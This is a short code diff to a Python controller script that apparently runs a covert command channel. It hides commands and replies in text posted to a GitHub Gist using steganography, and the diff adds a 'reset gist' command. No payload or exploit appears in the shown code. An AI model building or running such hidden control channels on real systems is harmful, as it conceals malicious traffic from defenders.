@@ -5,7 +5,7 @@ from time import sleep
 from datetime import datetime
 
 sys.path.append('..')
-from common.utils import add_message, check_chat_file, get_replies_to_msg_id, read_attachment
+from common.utils import add_message, check_chat_file, get_replies_to_msg_id, read_attachment, reset_gist
 from common.utils import CONTROLLER_NICK_NAME
 from common.gist import init_gist
 from common.chapters import get_chapter_for_path_encoding, get_chapter_for_command, read_chapter
@@ -13,8 +13,6 @@ from common.steganography import encode_to_text, decode_from_text
 
 
 HEARTBEAT_TIME = 60
-
-# TODO - reset Gist command
 
 
 def encode_path(pth):
@@ -58,6 +56,10 @@ def process_cmd(cmd):
                 decoded = decode_from_text(text)
                 print(f'Reply for message {msg_id} by {reply[0]}:')
                 print(decoded, flush=True)
+
+    elif cmd == 'reset gist':
+        reset_gist()
+        print('Gist reset to initial message', flush=True)
 
     else:
         print(f'Unknown command: {cmd}', flush=True)
